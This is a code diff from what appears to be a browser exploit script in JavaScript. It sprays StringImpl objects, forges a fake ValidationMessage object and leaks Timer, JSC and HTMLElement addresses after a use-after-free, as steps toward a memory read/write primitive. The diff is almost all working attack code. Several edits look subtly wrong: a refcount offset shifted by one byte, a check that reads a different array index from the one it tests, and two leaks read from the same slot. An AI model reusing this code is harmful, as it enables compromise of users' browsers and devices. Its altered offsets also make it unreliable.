@@ -2,7 +2,7 @@ const OFFSET_ELEMENT_REFCOUNT = 0x10;
 const OFFSET_JSAB_VIEW_VECTOR = 0x10;
 const OFFSET_JSAB_VIEW_LENGTH = 0x18;
 const OFFSET_LENGTH_STRINGIMPL = 0x04;
-const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;
+const OFFSET_HTMLELEMENT_REFCOUNT = 0x15;
 
 const LENGTH_ARRAYBUFFER = 0x8;
 const LENGTH_STRINGIMPL = 0x14;
@@ -241,7 +241,14 @@ function cleanup() {
  * Executed after buildBubbleTree
  * and before deleteBubbleTree
  */
+function confuseTargetObjRound2() {
+	if (findTargetObj() === false)
+		die("[!] Failed to reuse target obj.");
 
+	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
+
+	setTimeout(setupRW, 6000);
+}
 
 
 /* Executed after deleteBubbleTree */
@@ -349,7 +356,24 @@ function leakJSC() {
  * Executed after buildBubbleTree
  * and before deleteBubbleTree
  */
+function confuseTargetObjRound1() {
+	/* Force allocation of StringImpl obj. beyond Timer address */
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 3);
 
+	/* Checking for leaked data */
+	if (findTargetObj() === false)
+		die("[!] Failed to reuse target obj.");
+
+	dumpTargetObj();
+
+	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+
+	/*
+	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
+	 * the next 5s
+	 */
+	setTimeout(leakJSC, 6000);
+}
 
 function handle2() {
 	/* focus elsewhere */
@@ -403,12 +427,12 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
 				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
 				g_round++;
 			}
